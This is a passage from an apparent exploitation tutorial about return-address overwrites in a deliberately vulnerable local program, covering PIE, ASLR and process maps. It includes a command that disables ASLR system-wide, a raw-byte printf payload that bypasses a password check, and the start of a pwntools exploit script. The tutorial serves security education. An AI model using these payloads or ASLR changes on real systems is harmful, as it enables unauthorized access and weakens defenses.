</span></span><span style=display:flex><span>    10df:	ff <span style=color:#ae81ff>15</span> f3 2e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    	call   QWORD PTR <span style=color:#f92672>[</span>rip+0x2ef3<span style=color:#f92672>]</span>        <span style=color:#75715e># 3fd8 &lt;__libc_start_main@GLIBC_2.34&gt;</span>
</span></span><span style=display:flex><span>    10e5:	f4                   	hlt
</span></span><span style=display:flex><span>    10e6:	<span style=color:#ae81ff>66</span> 2e 0f 1f <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	cs nop WORD PTR <span style=color:#f92672>[</span>rax+rax*1+0x0<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    10ed:	<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>00000000000011a9 &lt;grantAccess&gt;:
</span></span><span style=display:flex><span>    11a9:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    11ad:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    11ae:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    11b1:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> 4c 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xe4c<span style=color:#f92672>]</span>        <span style=color:#75715e># 2004 &lt;_IO_stdin_used+0x4&gt;</span>
</span></span><span style=display:flex><span>    11b8:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    11bb:	e8 c0 fe ff ff       	call   <span style=color:#ae81ff>1080</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>    11c0:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    11c1:	5d                   	pop    rbp
</span></span><span style=display:flex><span>    11c2:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000011c3 &lt;checkPassword&gt;:
</span></span><span style=display:flex><span>    11c3:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    11c7:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    11c8:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    11cb:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>10</span>          	sub    rsp,0x10
</span></span><span style=display:flex><span>    11cf:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> 7d f8          	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rdi
</span></span><span style=display:flex><span>    11d3:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> <span style=color:#ae81ff>75</span> f0          	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>,rsi
</span></span><span style=display:flex><span>    11d7:	<span style=color:#ae81ff>48</span> 8b <span style=color:#ae81ff>45</span> f8          	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    11db:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>15</span> <span style=color:#ae81ff>31</span> 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rdx,<span style=color:#f92672>[</span>rip+0xe31<span style=color:#f92672>]</span>        <span style=color:#75715e># 2013 &lt;_IO_stdin_used+0x13&gt;</span>
</span></span><span style=display:flex><span>    11e2:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> d6             	mov    rsi,rdx
</span></span><span style=display:flex><span>    11e5:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    11e8:	e8 b3 fe ff ff       	call   10a0 &lt;strcmp@plt&gt;
</span></span><span style=display:flex><span>    11ed:	<span style=color:#ae81ff>85</span> c0                	test   eax,eax
</span></span><span style=display:flex><span>    11ef:	<span style=color:#ae81ff>75</span> 0a                	jne    11fb &lt;checkPassword+0x38&gt;
</span></span><span style=display:flex><span>    11f1:	<span style=color:#ae81ff>48</span> 8b <span style=color:#ae81ff>45</span> f0          	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    11f5:	c7 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>    	mov    DWORD PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,0x1
</span></span><span style=display:flex><span>    11fb:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    11fc:	c9                   	leave
</span></span><span style=display:flex><span>    11fd:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000011fe &lt;AuthenticateUser&gt;:
</span></span><span style=display:flex><span>    11fe:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    1202:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    1203:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    1206:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>10</span>          	sub    rsp,0x10
</span></span><span style=display:flex><span>    120a:	c7 <span style=color:#ae81ff>45</span> f4 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>    1211:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>04</span> 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xe04<span style=color:#f92672>]</span>        <span style=color:#75715e># 201c &lt;_IO_stdin_used+0x1c&gt;</span>
</span></span><span style=display:flex><span>    1218:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    121b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1220:	e8 6b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1225:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1229:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>    122c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> fa 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1233:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1236:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    123b:	e8 <span style=color:#ae81ff>70</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1240:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>55</span> f4          	lea    rdx,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1244:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1248:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> d6             	mov    rsi,rdx
</span></span><span style=display:flex><span>    124b:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    124e:	e8 <span style=color:#ae81ff>70</span> ff ff ff       	call   11c3 &lt;checkPassword&gt;
</span></span><span style=display:flex><span>    1253:	8b <span style=color:#ae81ff>45</span> f4             	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1256:	<span style=color:#ae81ff>83</span> f8 <span style=color:#ae81ff>01</span>             	cmp    eax,0x1
</span></span><span style=display:flex><span>    1259:	<span style=color:#ae81ff>75</span> 0c                	jne    <span style=color:#ae81ff>1267</span> &lt;AuthenticateUser+0x69&gt;
</span></span><span style=display:flex><span>    125b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1260:	e8 <span style=color:#ae81ff>44</span> ff ff ff       	call   11a9 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>    1265:	eb 0f                	jmp    <span style=color:#ae81ff>1276</span> &lt;AuthenticateUser+0x78&gt;
</span></span><span style=display:flex><span>    1267:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> c2 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdc2<span style=color:#f92672>]</span>        <span style=color:#75715e># 2030 &lt;_IO_stdin_used+0x30&gt;</span>
</span></span><span style=display:flex><span>    126e:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1271:	e8 0a fe ff ff       	call   <span style=color:#ae81ff>1080</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>    1276:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    1277:	c9                   	leave
</span></span><span style=display:flex><span>    1278:	c3                   	ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000000001279</span> &lt;main&gt;:
</span></span><span style=display:flex><span>    1279:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    127d:	<span style=color:#ae81ff>55</span>                   	push   rbp
</span></span><span style=display:flex><span>    127e:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    1281:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1286:	e8 <span style=color:#ae81ff>73</span> ff ff ff       	call   11fe &lt;AuthenticateUser&gt;
</span></span><span style=display:flex><span>    128b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1290:	5d                   	pop    rbp
</span></span><span style=display:flex><span>    1291:	c3                   	ret
</span></span></code></pre></div><p>Few differences we can note between disassembly of PIE and non PIE binaries are</p><p><strong>1. PIE uses relative addressing everywhere</strong></p><p>The non-PIE version uses absolute addresses</p><pre tabindex=0><code>40119e:  bf 04 20 40 00        mov    edi,0x402004
</code></pre><p>The PIE version uses RIP-relative addressing</p><pre tabindex=0><code> 11b1:	48 8d 05 4c 0e 00 00 	lea    rax,[rip+0xe4c] 
</code></pre><p>Position-Independent Executables are designed so the loader can place them at any base address in memory.
To support this, the code must avoid using fixed, hard-coded absolute addresses. When the binary is relocated, the relative distances between instructions and sections stay the same, but their absolute virtual addresses change. Because of this relocation, any instruction containing a literal absolute address would become invalid, which is why PIE relies on RIP-relative addressing instead of fixed addresses.</p><p><strong>2. Difference in Base Address</strong></p><p>In non-PIE executables, the virtual addresses in the ELF file are fixed and assume the traditional ELF load base of 0x400000. This is why their .text and other segments appear at small, low canonical addresses (e.g., 0x401000). The loader places them exactly there because they are not relocatable.</p><p>In contrast, PIE executables behave like shared libraries: they are compiled to be fully relocatable, and the loader chooses where to map them at runtime. When ASLR is enabled, the loader typically places PIE binaries much higher in the address space (e.g., 0x55xxxxxxx000 on Linux) so it can randomize the base address for security. That’s why PIE binaries show up at high addresses, while non-PIE binaries always sit near 0x400000.</p><p>ASLR has no effect on non PIE executables. For PIE executables, when ASLR is disabled, the base address will always be <code>0x555555554000</code>, when ASLR is enabled, it will be a random address.</p><h5 id=process-maps>Process Maps<a hidden class=anchor aria-hidden=true href=#process-maps>#</a></h5><p>A process map (also called memory map, address space map, or proc map) is a view of how a running process’s virtual memory is laid out.
It shows which memory regions exist, where they are located, how large they are, what permissions they have, and what each region belongs to (code, stack, heap, shared libraries, etc.).</p><p>You typically view this in Linux using:</p><pre tabindex=0><code>cat /proc/&lt;pid&gt;/maps
</code></pre><p>or inside gdb using:</p><pre tabindex=0><code>info proc mappings
</code></pre><p><strong>What the Process Map Represents?</strong></p><p>Every process runs inside its own virtual address space, which the OS divides into segments.
The process map lists these segments, such as:</p><p><strong>1. The Program Itself</strong></p><p>These entries correspond to your binary:
• <code>.text</code> (code)
• <code>.rodata</code> (read-only data)
• <code>.data</code> (initialized global data)
• <code>.bss</code> (uninitialized global data)</p><p>They are shown with <code>r-xp</code>, <code>r--p</code>, <code>rw-p</code> permissions depending on their use.</p><p><strong>2. The Heap</strong></p><p>A dynamically growing region used by:
• malloc
• new
• dynamic data structures</p><p><strong>3. Shared Libraries</strong></p><p>Loaded <code>.so</code> files like:
• libc
• libpthread
• ld-linux loader</p><p>Each library has multiple mapped regions (code, data, etc.).</p><ol start=4><li>The Stack</li></ol><p>One big region for the program’s main thread:</p><p>Holds:
• return addresses
• local variables
• saved registers
• stack frames</p><ol><li>Memory-Mapped Files</li></ol><p>Any file mapped by mmap() (config files, JIT regions, etc.)
Example:</p><pre tabindex=0><code>/memfd:x/y (deleted)
</code></pre><ol start=6><li>Special Kernel Regions</li></ol><p>Such as:
• [vdso]
• [vvar]
• [vsyscall]</p><p>Used to optimize system calls and provide kernel data.</p><p>Using this we can inspect the process&rsquo;s and figure out the base address, this works even if ASLR is enabled, but it means the attacker should have access to your computer.</p><p>We can disable ASLR system wide by</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#ae81ff>0</span> | sudo tee /proc/sys/kernel/randomize_va_space
</span></span></code></pre></div><p>We can run the program and get its pid</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ ps aux | grep vuln
</span></span><span style=display:flex><span>sanketh    <span style=color:#ae81ff>12839</span>  0.0  0.0   <span style=color:#ae81ff>2680</span>  <span style=color:#ae81ff>1380</span> pts/1    S+   16:19   0:00 /home/sanketh/Desktop/vuln
</span></span></code></pre></div><p>We can get its map using</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /proc/12839/maps
</span></span><span style=display:flex><span>555555554000-555555555000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>555555555000-555555556000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>555555556000-555555557000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>555555557000-555555558000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>555555558000-555555559000 rw-p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>555555559000-55555557a000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7ffff7c00000-7ffff7c28000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>7ffff7c28000-7ffff7db0000 r-xp <span style=color:#ae81ff>00028000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>7ffff7db0000-7ffff7dff000 r--p 001b0000 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>7ffff7dff000-7ffff7e03000 r--p 001fe000 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>7ffff7e03000-7ffff7e05000 rw-p <span style=color:#ae81ff>00202000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>7ffff7e05000-7ffff7e12000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7ffff7fa6000-7ffff7fa9000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7ffff7fbd000-7ffff7fbf000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>7ffff7fbf000-7ffff7fc1000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7ffff7fc1000-7ffff7fc3000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar_vclock<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7ffff7fc3000-7ffff7fc5000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>7ffff7fc5000-7ffff7fc6000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffff7fc6000-7ffff7ff1000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffff7ff1000-7ffff7ffb000 r--p 0002c000 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffff7ffb000-7ffff7ffd000 r--p <span style=color:#ae81ff>00036000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffff7ffd000-7ffff7fff000 rw-p <span style=color:#ae81ff>00038000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffffffde000-7ffffffff000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>ffffffffff600000-ffffffffff601000 --xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                  <span style=color:#f92672>[</span>vsyscall<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>This confirms what we were expecting, if ASLR is disabled, base address will be <code>0x555555554000</code>. Adding this to <code>grantAccess</code>&rsquo;s address gives <code>0x5555555551a9</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ printf <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAA\xa9\x51\x55\x55\x55\x55\x00\x00&#39;</span> | ./vuln
</span></span><span style=display:flex><span>Enter password: Authentication Failed
</span></span><span style=display:flex><span>Access Granted
</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
</span></span></code></pre></div><h4 id=position-independent-executable-without-aslr-1>Position Independent Executable Without ASLR<a hidden class=anchor aria-hidden=true href=#position-independent-executable-without-aslr-1>#</a></h4><p>We can build the payload similarly when ASLR is enabled</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /proc/13003/maps
</span></span><span style=display:flex><span>5af5bbc3d000-5af5bbc3e000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>5af5bbc3e000-5af5bbc3f000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>5af5bbc3f000-5af5bbc40000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>5af5bbc40000-5af5bbc41000 r--p <span style=color:#ae81ff>00002000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>5af5bbc41000-5af5bbc42000 rw-p <span style=color:#ae81ff>00003000</span> 08:01 <span style=color:#ae81ff>48496671</span>                   /home/sanketh/Desktop/vuln
</span></span><span style=display:flex><span>5af5cf6f7000-5af5cf718000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>heap<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>70f2a1e00000-70f2a1e28000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>70f2a1e28000-70f2a1fb0000 r-xp <span style=color:#ae81ff>00028000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>70f2a1fb0000-70f2a1fff000 r--p 001b0000 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>70f2a1fff000-70f2a2003000 r--p 001fe000 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>70f2a2003000-70f2a2005000 rw-p <span style=color:#ae81ff>00202000</span> 08:01 <span style=color:#ae81ff>78907426</span>                   /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style=display:flex><span>70f2a2005000-70f2a2012000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>70f2a2152000-70f2a2155000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>70f2a2169000-70f2a216b000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>70f2a216b000-70f2a216d000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>70f2a216d000-70f2a216f000 r--p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vvar_vclock<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>70f2a216f000-70f2a2171000 r-xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>vdso<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>70f2a2171000-70f2a2172000 r--p <span style=color:#ae81ff>00000000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>70f2a2172000-70f2a219d000 r-xp <span style=color:#ae81ff>00001000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>70f2a219d000-70f2a21a7000 r--p 0002c000 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>70f2a21a7000-70f2a21a9000 r--p <span style=color:#ae81ff>00036000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>70f2a21a9000-70f2a21ab000 rw-p <span style=color:#ae81ff>00038000</span> 08:01 <span style=color:#ae81ff>78906094</span>                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
</span></span><span style=display:flex><span>7ffffb176000-7ffffb197000 rw-p <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                          <span style=color:#f92672>[</span>stack<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>ffffffffff600000-ffffffffff601000 --xp <span style=color:#ae81ff>00000000</span> 00:00 <span style=color:#ae81ff>0</span>                  <span style=color:#f92672>[</span>vsyscall<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>The base address is <code>0x5af5bbc3d000</code> which is randomly generated. The address of <code>grantAccess</code> is <code>0x5af5bbc3e1a9</code></p><p>Since we need to run the program and inspect it to build the payload, we can&rsquo;t use te command line utilities like <code>printf</code> like earlier to pass raw bytes as input. So we can write a python script using <code>pwntools</code> which rums the program, inspects it, builds the payload and passes it to the program as raw bytes.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start the process</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./vuln&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Read base address from /proc maps</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;/proc/</span><span style=color:#e6db74>{</span>p<span style=color:#f92672>.</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>/maps&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> f:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;r-xp&#39;</span> <span style=color:#f92672>in</span> line <span style=color:#f92672>and</span> <span style=color:#e6db74>&#39;vuln&#39;</span> <span style=color:#f92672>in</span> line:
</span></span><span style=display:flex><span>            text_base <span style=color:#f92672>=</span> int(line<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Calculate grantAccess address</span>
</span></span><span style=display:flex><span>grant_access <span style=color:#f92672>=</span> text_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1a9</span>
</span></span><span style=display:flex><span>
